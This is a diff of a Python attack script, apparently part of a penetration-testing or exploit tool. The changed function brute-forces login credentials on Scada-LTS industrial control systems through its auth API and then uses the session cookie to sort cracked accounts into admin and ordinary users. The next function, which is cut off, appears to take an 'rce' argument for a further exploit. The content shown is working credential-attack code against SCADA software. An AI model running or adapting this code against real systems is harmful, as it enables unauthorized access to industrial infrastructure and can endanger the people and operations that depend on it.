@@ -29,13 +29,19 @@ def bruteforce_password_scada(scada_url, username_file, password_file):
     with open(username_file, 'r') as f:
         usernames = [p.replace('\n', '') for p in f.readlines()]
 
-    found = []
+    foundAdmin, foundUser = [], []
     for user, pasw in itertools.product(usernames, passwords):
         res = requests.get(scada_url+f'/ScadaLTS/api/auth/{user}/{pasw}')
-        if 'Set-Cookie' in res.headers:
-            found.append((user, pasw))
+        if 'Set-Cookie' not in res.headers: continue
+        jsession_cookie=res.headers['Set-Cookie']
+        headers = {'Cookie': jsession_cookie}
+        res = requests.get(scada_url+f'/ScadaLTS/api/auth/isRoleUser', headers=headers)
+        if res.text == 'true':
+            foundUser.append((user, pasw))
+        else:
+            foundAdmin.append((user, pasw))
     
-    return found
+    return foundAdmin, foundUser
 
 def bruteforce_password_ditto(scada_url, rce, password_file):
     with open(password_file, 'r') as f:
